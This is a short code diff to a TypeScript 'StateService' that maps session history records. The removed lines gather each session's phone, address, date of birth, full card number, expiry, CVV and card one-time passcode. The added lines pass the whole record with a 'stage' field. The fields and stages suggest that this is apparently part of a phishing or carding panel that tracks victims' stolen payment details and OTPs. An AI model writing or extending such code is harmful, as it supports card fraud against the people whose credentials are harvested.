@@ -663,18 +663,8 @@ export class StateService {
           status: s.status,
           fingerprint: s.fingerprint,
           isPinned: s.isPinned,
-          data: {
-            phone: s.phoneNumber,
-            country: s.country,
-            address: s.address,
-            dob: s.dob,
-            cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
-            cardLast4: s.cardNumber ? s.cardNumber.slice(-4) : '',
-            fullCard: s.cardNumber,
-            expiry: s.cardExpiry,
-            cvv: s.cardCvv,
-            cardOtp: s.cardOtp
-          }
+          stage: s.stage,
+          data: s
     }));
     
     mappedHistory.sort((a, b) => b.timestamp.getTime() - a.timestamp.getTime());
